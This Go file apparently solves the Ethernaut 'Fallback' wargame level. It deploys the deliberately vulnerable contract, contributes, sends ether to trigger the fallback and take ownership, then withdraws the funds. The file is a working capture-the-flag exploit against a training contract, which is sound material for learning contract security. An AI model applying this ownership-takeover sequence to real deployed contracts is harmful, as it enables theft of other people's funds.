package attack

import (
	"Ethernaut/api/fallback"
	"Ethernaut/pkg/client"
	"fmt"
	"log"
	"math/big"
)

func Fallback(c *client.Client) error {
	c.PrintAllBalances()

	// Deploy and send ether to contract
	opts, err := c.TransactOptions(0, 0, 500000)
	if err != nil {
		return err
	}

	addr, _, _, err := fallback.DeployFallback(opts, c.EthConn)
	if err != nil {
		return fmt.Errorf("deploy: %s", err)
	}

	err = c.SendEther(
		c.WalletAddressBySerialNumber[0],
		addr.Hex(),
		big.NewInt(5000000000000000000),
		500000)
	if err != nil {
		return fmt.Errorf("send: %s", err)
	}
	// ---------------------

	// Change owner
	inst, err := fallback.NewFallback(addr, c.EthConn)
	if err != nil {
		log.Fatalln(err)
	}

	opts, err = c.TransactOptions(1, 50000, 150000)
	if err != nil {
		return err
	}

	_, err = inst.Contribute(opts)
	if err != nil {
		return fmt.Errorf("contribute: %s", err)
	}

	err = c.SendEther(
		c.WalletAddressBySerialNumber[1],
		addr.Hex(),
		big.NewInt(1000000000000000000),
		500000)
	if err != nil {
		return fmt.Errorf("send: %s", err)
	}
	// ---------------

	opts, err = c.TransactOptions(1, 0, 150000)
	if err != nil {
		return err
	}

	_, err = inst.Withdraw(opts)
	if err != nil {
		return fmt.Errorf("with draw: %s", err)
	}

	c.PrintAllBalances()

	return nil
}
